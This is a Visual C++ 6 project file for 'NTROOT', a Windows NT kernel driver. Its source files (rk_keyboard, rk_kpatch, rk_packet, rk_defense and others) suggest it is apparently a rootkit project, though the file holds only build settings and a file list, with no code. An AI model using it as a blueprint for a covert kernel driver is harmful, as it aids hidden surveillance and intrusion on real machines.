# Microsoft Developer Studio Project File - Name="NTROOT" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=NTROOT - Win32 Checked
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "NTROOT.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "NTROOT.mak" CFG="NTROOT - Win32 Checked"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "NTROOT - Win32 Free" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "NTROOT - Win32 Checked" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "NTROOT - Win32 Free"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Free"
# PROP BASE Intermediate_Dir "Free"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Free"
# PROP Intermediate_Dir "Free"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /Gz /W3 /WX /Oy /Gy /D "WIN32" /D "_WINDOWS" /Oxs /c
# ADD CPP /nologo /Gz /W3 /WX /Oy /Gy /I "$(BASEDIR)\inc" /I "$(CPU)\\" /I "." /FI"$(BASEDIR)\inc\warning.h" /D WIN32=100 /D "_WINDOWS" /D "STD_CALL" /D CONDITION_HANDLING=1 /D NT_UP=1 /D NT_INST=0 /D _NT1X_=100 /D WINNT=1 /D _WIN32_WINNT=0x0400 /D WIN32_LEAN_AND_MEAN=1 /D DEVL=1 /D FPO=1 /D "_IDWBUILD" /D "NDEBUG" /D _DLL=1 /D _X86_=1 /D $(CPU)=1 /Oxs /Zel -cbstring /QIfdiv- /QIf /GF /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /o "NUL" /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /o "NUL" /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /i "$(BASEDIR)\inc" /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /machine:IX86
# ADD LINK32 int64.lib ntoskrnl.lib hal.lib $(BASEDIR)\lib\$(CPU)\free\ndis.lib /nologo /base:"0x10000" /version:4.0 /entry:"DriverEntry" /pdb:none /debug /debugtype:coff /machine:IX86 /nodefaultlib /out:"C:\DDK\lib\i386\free\NTROOT.sys" /libpath:"$(BASEDIR)\lib\i386\free" /driver /debug:notmapped,MINIMAL /IGNORE:4001,4037,4039,4065,4070,4078,4087,4089,4096 /MERGE:_PAGE=PAGE /MERGE:_TEXT=.text /SECTION:INIT,d /MERGE:.rdata=.text /FULLBUILD /RELEASE /FORCE:MULTIPLE /OPT:REF /OPTIDATA /align:0x20 /osversion:4.00 /subsystem:native

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Checked"
# PROP BASE Intermediate_Dir "Checked"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Checked"
# PROP Intermediate_Dir "Checked"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /Gz /W3 /Zi /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /YX /FD /c
# ADD CPP /nologo /Gz /W3 /Z7 /Oi /Gy /I "$(BASEDIR)\inc" /I "$(CPU)\\" /I "." /FI"$(BASEDIR)\inc\warning.h" /D WIN32=100 /D "_DEBUG" /D "_WINDOWS" /D "STD_CALL" /D CONDITION_HANDLING=1 /D NT_UP=1 /D NT_INST=0 /D _NT1X_=100 /D WINNT=1 /D _WIN32_WINNT=0x0400 /D WIN32_LEAN_AND_MEAN=1 /D DBG=1 /D DEVL=1 /D FPO=0 /D "NDEBUG" /D _DLL=1 /D _X86_=1 /FR /YX /FD /Zel -cbstring /QIfdiv- /QIf /GF /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /o "NUL" /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /o "NUL" /win32
# ADD BASE RSC /l 0x409 /d "_DEBUG"
# ADD RSC /l 0x409 /i "$(BASEDIR)\inc" /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /machine:IX86
# ADD LINK32 int64.lib ntoskrnl.lib hal.lib $(BASEDIR)\lib\$(CPU)\checked\ndis.lib /nologo /base:"0x10000" /version:4.0 /entry:"DriverEntry" /pdb:none /debug /debugtype:both /machine:IX86 /nodefaultlib /out:".\Output\NTROOT.sys" /libpath:"$(BASEDIR)\lib\i386\checked" /driver /debug:notmapped,FULL /IGNORE:4001,4037,4039,4065,4078,4087,4089,4096 /MERGE:_PAGE=PAGE /MERGE:_TEXT=.text /SECTION:INIT,d /MERGE:.rdata=.text /FULLBUILD /RELEASE /FORCE:MULTIPLE /OPT:REF /OPTIDATA /align:0x20 /osversion:4.00 /subsystem:native
# Begin Special Build Tool
SOURCE="$(InputPath)"
PostBuild_Cmds=g:\NTICE\nmsym.exe /translate:source,package,always c:\winnt\system32\drivers\NTROOT.sys
# End Special Build Tool

!ENDIF 

# Begin Target

# Name "NTROOT - Win32 Free"
# Name "NTROOT - Win32 Checked"
# Begin Group "Source Files"

# PROP Default_Filter ".c;.cpp"
# Begin Source File

SOURCE=.\rk_command.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_defense.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_driver.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_exec.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_interrupt.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_ioman.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_keyboard.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_kpatch.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_memory.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_object.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_packet.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_process.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_router.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\rk_utility.c

!IF  "$(CFG)" == "NTROOT - Win32 Free"

!ELSEIF  "$(CFG)" == "NTROOT - Win32 Checked"

!ENDIF 

# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter ".h"
# Begin Source File

SOURCE=.\NDIS.H
# End Source File
# Begin Source File

SOURCE=.\NETEVENT.H
# End Source File
# Begin Source File

SOURCE=.\NTDDKBD.H
# End Source File
# Begin Source File

SOURCE=.\NTDDNDIS.H
# End Source File
# Begin Source File

SOURCE=.\NTDDPACK.H
# End Source File
# Begin Source File

SOURCE=.\PACKOFF.H
# End Source File
# Begin Source File

SOURCE=.\PACKON.H
# End Source File
# Begin Source File

SOURCE=.\rk_command.h
# End Source File
# Begin Source File

SOURCE=.\rk_defense.h
# End Source File
# Begin Source File

SOURCE=.\rk_driver.h
# End Source File
# Begin Source File

SOURCE=.\rk_exec.h
# End Source File
# Begin Source File

SOURCE=.\rk_files.h
# End Source File
# Begin Source File

SOURCE=.\rk_interrupt.h
# End Source File
# Begin Source File

SOURCE=.\rk_ioman.h
# End Source File
# Begin Source File

SOURCE=.\rk_keyboard.h
# End Source File
# Begin Source File

SOURCE=.\rk_kpatch.h
# End Source File
# Begin Source File

SOURCE=.\rk_memory.h
# End Source File
# Begin Source File

SOURCE=.\rk_object.h
# End Source File
# Begin Source File

SOURCE=.\rk_packet.h
# End Source File
# Begin Source File

SOURCE=.\rk_process.h
# End Source File
# Begin Source File

SOURCE=.\rk_router.h
# End Source File
# Begin Source File

SOURCE=.\rk_security.h
# End Source File
# Begin Source File

SOURCE=.\rk_utility.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter ".rc;.mc"
# End Group
# End Target
# End Project
